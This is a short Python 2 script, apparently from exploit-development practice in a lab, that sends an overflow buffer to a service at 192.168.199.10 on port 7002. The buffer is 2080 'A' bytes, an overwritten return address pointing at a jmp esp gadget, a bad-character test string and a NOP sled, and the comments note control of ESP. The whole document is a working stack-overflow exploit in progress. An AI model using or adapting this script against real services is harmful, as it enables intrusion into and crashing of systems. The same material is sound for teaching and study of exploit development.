#!/usr/bin/python
import socket

print "\nSending evil buffer..."
buffer = "A" * 2080

# jmp esp
# 1480113D
eip = "\x3d\x11\x80\x14"

# offset = "C" * (2096 - (len(buffer) - len(eip))) # len 20
badchars = "\x01\x02\x03\x04\x05\x06\07\x08\x09\x0b\x0c\x0e\x0f\x10"
# print len(badchars) # 14
nops = "\x90" * 6
# print len(nops)

input_buffer = buffer + eip + badchars + nops
# now that I have control of esp, try to jmp ecx

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.199.10", 7002))
s.send(input_buffer)

s.close()

print "\nDone!"
